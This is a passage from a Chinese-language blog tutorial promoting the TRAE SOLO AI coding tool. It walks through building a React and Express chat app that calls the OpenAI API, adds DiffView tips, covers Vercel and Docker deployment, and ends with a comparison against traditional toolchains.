<span class="hljs-keyword">const</span> <span class="hljs-title function_">ImageLoader</span> = (<span class="hljs-params">{ src, alt, fallback }</span>) =&gt; {
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>);
  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"image-loader"</span>&gt;</span>
      {loading &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"loading-spinner"</span>&gt;</span>🔄 加载中...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}
      {error &amp;&amp; (
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"error-message"</span>&gt;</span>
          {fallback || '❌ 图片加载失败'}
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      )}
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
        <span class="hljs-attr">src</span>=<span class="hljs-string">{src}</span>
        <span class="hljs-attr">alt</span>=<span class="hljs-string">{alt}</span>
        <span class="hljs-attr">onLoad</span>=<span class="hljs-string">{()</span> =&gt;</span> setLoading(false)}
        onError={() =&gt; {
          setLoading(false);
          setError(true);
        }}
        style={{ display: loading || error ? 'none' : 'block' }}
      /&gt;
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<h5 data-id="heading-8">DiffView 高级应用</h5>
<ol>
<li><strong>分支对比</strong>：比较不同分支的代码差异</li>
<li><strong>历史版本对比</strong>：查看代码的演变过程</li>
<li><strong>合并预览</strong>：在合并代码前查看可能的冲突</li>
<li><strong>性能对比</strong>：分析不同实现方案的性能差异</li>
</ol>
<h3 data-id="heading-9">🚀 实战案例：AI聊天应用全流程开发</h3>
<p>让我们通过一个AI聊天应用的开发流程，来体验TRAE SOLO的全链路开发能力。</p>
<h4 data-id="heading-10">1. 需求分析与技术选型</h4>
<p><strong>需求</strong>：开发一个基于Web的AI聊天应用，支持多轮对话、历史记录保存、主题切换等功能。</p>
<p><strong>技术选型</strong>：</p>
<ul>
<li>前端：React 18 + TypeScript + Vite</li>
<li>后端：Node.js + Express</li>
<li>AI模型：OpenAI API</li>
</ul>
<h4 data-id="heading-11">2. 使用 SOLO coder 快速搭建基础架构</h4>
<h5 data-id="heading-12">前端核心组件</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 使用 SOLO coder 生成的聊天应用主组件</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState, useRef, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Message</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'../types'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChatInput</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./ChatInput'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MessageList</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./MessageList'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Header</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Header'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title class_">ChatApp</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> [messages, setMessages] = useState&lt;<span class="hljs-title class_">Message</span>[]&gt;([]);
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> messagesEndRef = useRef&lt;<span class="hljs-title class_">HTMLDivElement</span>&gt;(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// 滚动到最新消息</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">scrollToBottom</span> = (<span class="hljs-params"/>) =&gt; {
    messagesEndRef.<span class="hljs-property">current</span>?.<span class="hljs-title function_">scrollIntoView</span>({ <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span> });
  };

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">scrollToBottom</span>();
  }, [messages]);

  <span class="hljs-comment">// 发送消息</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">sendMessage</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">text: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-keyword">if</span> (!text.<span class="hljs-title function_">trim</span>()) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// 添加用户消息</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">userMessage</span>: <span class="hljs-title class_">Message</span> = {
      <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>().<span class="hljs-title function_">toString</span>(),
      text,
      <span class="hljs-attr">sender</span>: <span class="hljs-string">'user'</span>,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
    };

    <span class="hljs-title function_">setMessages</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> [...prev, userMessage]);
    <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>);

    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 调用AI接口</span>
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/chat'</span>, {
        <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
        <span class="hljs-attr">headers</span>: {
          <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
        },
        <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">messages</span>: [...messages, userMessage] })
      });

      <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();

      <span class="hljs-comment">// 添加AI回复</span>
      <span class="hljs-keyword">const</span> <span class="hljs-attr">aiMessage</span>: <span class="hljs-title class_">Message</span> = {
        <span class="hljs-attr">id</span>: (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + <span class="hljs-number">1</span>).<span class="hljs-title function_">toString</span>(),
        <span class="hljs-attr">text</span>: data.<span class="hljs-property">response</span>,
        <span class="hljs-attr">sender</span>: <span class="hljs-string">'ai'</span>,
        <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
      };

      <span class="hljs-title function_">setMessages</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> [...prev, aiMessage]);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'聊天错误:'</span>, error);
      <span class="hljs-comment">// 添加错误消息</span>
      <span class="hljs-keyword">const</span> <span class="hljs-attr">errorMessage</span>: <span class="hljs-title class_">Message</span> = {
        <span class="hljs-attr">id</span>: (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + <span class="hljs-number">1</span>).<span class="hljs-title function_">toString</span>(),
        <span class="hljs-attr">text</span>: <span class="hljs-string">'抱歉，暂时无法响应，请稍后重试'</span>,
        <span class="hljs-attr">sender</span>: <span class="hljs-string">'ai'</span>,
        <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
      };
      <span class="hljs-title function_">setMessages</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> [...prev, errorMessage]);
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>);
    }
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"chat-app"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">MessageList</span> 
        <span class="hljs-attr">messages</span>=<span class="hljs-string">{messages}</span> 
        <span class="hljs-attr">loading</span>=<span class="hljs-string">{loading}</span>
      /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{messagesEndRef}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">ChatInput</span> <span class="hljs-attr">onSendMessage</span>=<span class="hljs-string">{sendMessage}</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">{loading}</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">ChatApp</span>;
</code></pre>
<h5 data-id="heading-13">后端服务</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用 SOLO coder 生成的后端服务</span>
<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
<span class="hljs-keyword">const</span> cors = <span class="hljs-built_in">require</span>(<span class="hljs-string">'cors'</span>);
<span class="hljs-keyword">const</span> { <span class="hljs-title class_">Configuration</span>, <span class="hljs-title class_">OpenAIApi</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'openai'</span>);

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();
app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cors</span>());
app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());

<span class="hljs-comment">// 配置 OpenAI API</span>
<span class="hljs-keyword">const</span> configuration = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>({
  <span class="hljs-attr">apiKey</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">OPENAI_API_KEY</span>,
});
<span class="hljs-keyword">const</span> openai = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAIApi</span>(configuration);

<span class="hljs-comment">// 聊天接口</span>
app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/chat'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> { messages } = req.<span class="hljs-property">body</span>;

    <span class="hljs-comment">// 构建 OpenAI API 请求</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-title function_">createChatCompletion</span>({
      <span class="hljs-attr">model</span>: <span class="hljs-string">"gpt-3.5-turbo"</span>,
      <span class="hljs-attr">messages</span>: messages.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">msg</span> =&gt;</span> ({
        <span class="hljs-attr">role</span>: msg.<span class="hljs-property">sender</span> === <span class="hljs-string">'user'</span> ? <span class="hljs-string">'user'</span> : <span class="hljs-string">'assistant'</span>,
        <span class="hljs-attr">content</span>: msg.<span class="hljs-property">text</span>
      })),
      <span class="hljs-attr">temperature</span>: <span class="hljs-number">0.7</span>,
    });

    res.<span class="hljs-title function_">json</span>({
      <span class="hljs-attr">response</span>: response.<span class="hljs-property">data</span>.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>?.<span class="hljs-property">content</span> || <span class="hljs-string">'未收到响应'</span>
    });
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'API错误:'</span>, error);
    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'服务器内部错误'</span> });
  }
});

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">3001</span>;
app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`服务器运行在 http://localhost:<span class="hljs-subst">${PORT}</span>`</span>);
});
</code></pre>
<h4 data-id="heading-14">3. 使用 DiffView 优化代码结构</h4>
<p>在开发过程中，我们可能需要优化代码结构，例如将状态管理从组件内部迁移到Context中。使用DiffView可以清晰地看到这些变更：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 优化前：组件内部状态管理</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ChatApp</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> [messages, setMessages] = useState&lt;<span class="hljs-title class_">Message</span>[]&gt;([]);
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-comment">// ...</span>
};

<span class="hljs-comment">// 优化后：使用 Context 进行状态管理</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ChatContext</span> = createContext&lt;<span class="hljs-title class_">ChatContextType</span>&gt;({
  <span class="hljs-attr">messages</span>: [],
  <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-attr">sendMessage</span>: <span class="hljs-keyword">async</span> () =&gt; {},
  <span class="hljs-attr">clearMessages</span>: <span class="hljs-function">() =&gt;</span> {}
});

<span class="hljs-keyword">const</span> <span class="hljs-title class_">ChatProvider</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;{ <span class="hljs-attr">children</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span> }&gt; = <span class="hljs-function">(<span class="hljs-params">{ children }</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> [messages, setMessages] = useState&lt;<span class="hljs-title class_">Message</span>[]&gt;([]);
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-comment">// 发送消息的逻辑</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">sendMessage</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">text: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-comment">// ... 实现逻辑</span>
  };

  <span class="hljs-comment">// 清空消息</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearMessages</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setMessages</span>([]);
  };

  <span class="hljs-keyword">const</span> value = {
    messages,
    loading,
    sendMessage,
    clearMessages
  };

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChatContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{value}</span>&gt;</span>{children}<span class="hljs-tag">&lt;/<span class="hljs-name">ChatContext.Provider</span>&gt;</span></span>;
};

<span class="hljs-comment">// 自定义 Hook 方便使用 Context</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">useChat</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> context = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ChatContext</span>);
  <span class="hljs-keyword">if</span> (!context) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'useChat must be used within a ChatProvider'</span>);
  }
  <span class="hljs-keyword">return</span> context;
};

<span class="hljs-comment">// 优化后的组件</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ChatApp</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChatProvider</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"chat-app"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">MessageList</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ChatInput</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ChatProvider</span>&gt;</span></span>
  );
};
</code></pre>
<h4 data-id="heading-15">4. 部署与上线</h4>
<p>TRAE SOLO提供了一键式部署功能，支持多种部署方式：</p>
<ol>
<li>
<p><strong>Vercel 部署</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 SOLO coder 生成的 Vercel 部署脚本</span>
vercel init
vercel deploy
</code></pre>
</li>
<li>
<p><strong>Docker 容器化部署</strong></p>
<pre><code class="hljs language-dockerfile" lang="dockerfile"># 使用 SOLO coder 生成的 Dockerfile
FROM node:18-alpine

WORKDIR /app

COPY package*.json ./
RUN npm install

COPY . .

RUN npm run build

EXPOSE 3000

CMD ["npm", "start"]
</code></pre>
</li>
</ol>
<h3 data-id="heading-16">⚠️ 避坑指南与最佳实践</h3>
<h4 data-id="heading-17">1. SOLO coder 使用注意事项</h4>
<ul>
<li><strong>避免模糊的提示</strong>：提示越具体，生成的代码质量越高</li>
<li><strong>验证生成的代码</strong>：虽然代码质量很高，但仍需验证逻辑正确性和安全性</li>
<li><strong>关注性能问题</strong>：对于生成的代码，要注意检查是否存在性能瓶颈</li>
<li><strong>保护API密钥</strong>：不要将敏感信息直接包含在生成的代码中</li>
</ul>
<h4 data-id="heading-18">2. DiffView 高效使用技巧</h4>
<ul>
<li><strong>设置合适的比较范围</strong>：避免比较过大的代码文件</li>
<li><strong>使用过滤功能</strong>：只查看关键代码的差异</li>
<li><strong>结合版本控制</strong>：与Git等版本控制工具结合使用，效果更佳</li>
<li><strong>定期保存对比结果</strong>：对于重要的代码变更，保存对比结果以便后续参考</li>
</ul>
<h4 data-id="heading-19">3. 全链路开发最佳实践</h4>
<ul>
<li><strong>采用模块化设计</strong>：将应用拆分为多个独立模块，提高可维护性</li>
<li><strong>使用TypeScript</strong>：增强代码的类型安全性</li>
<li><strong>实现自动化测试</strong>：确保应用的稳定性</li>
<li><strong>监控与日志</strong>：添加监控和日志功能，便于排查问题</li>
<li><strong>性能优化</strong>：定期进行性能分析和优化</li>
</ul>
<h3 data-id="heading-20">🎯 与传统开发工具的对比</h3>



































<table><thead><tr><th>特性</th><th>TRAE SOLO</th><th>传统开发工具链</th></tr></thead><tbody><tr><td>代码生成</td><td>✅ 智能生成高质量代码</td><td>❌ 需要手动编写</td></tr><tr><td>差异对比</td><td>✅ 可视化DiffView</td><td>⚠️ 依赖第三方工具</td></tr><tr><td>部署流程</td><td>✅ 一键式部署</td><td>❌ 手动配置复杂</td></tr><tr><td>全链路支持</td><td>✅ 从开发到部署的完整流程</td><td>❌ 工具链割裂</td></tr><tr><td>协作效率</td><td>✅ 团队协作功能完善</td><td>⚠️ 协作成本高</td></tr></tbody></table>
<h3 data-id="heading-21">📝 总结</h3>
<p>TRAE SOLO正式版作为一款全链路AI开发工具，通过SOLO coder、DiffView等核心功能，为AI应用开发带来了全新的范式。它不仅提高了开发效率，还提升了代码质量和协作体验。</p>
<p>通过本文的介绍和实战案例，相信你已经对TRAE SOLO有了深入的了解。无论你是AI开发新手还是资深开发者，TRAE SOLO都能成为你开发路上的得力助手！</p>
<p>让我们一起拥抱AI开发的新时代，用TRAE SOLO创造更多精彩的AI应用吧！ 🤗</p>
<hr/>
<p><strong>相关资源：</strong></p>
<ul>
<li><a href="https://trae.ai/docs" target="_blank" title="https://trae.ai/docs" ref="nofollow noopener noreferrer">TRAE SOLO 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2F" target="_blank" title="https://react.dev/" ref="nofollow noopener noreferrer">React 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.openai.com%2Fdocs%2F" target="_blank" title="https://platform.openai.com/docs/" ref="nofollow noopener noreferrer">OpenAI API 文档</a></li>
</ul>
<p><strong>标签：</strong> #AI开发 #TRAE_SOLO #全链路开发 #前端技术 #工具实测</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>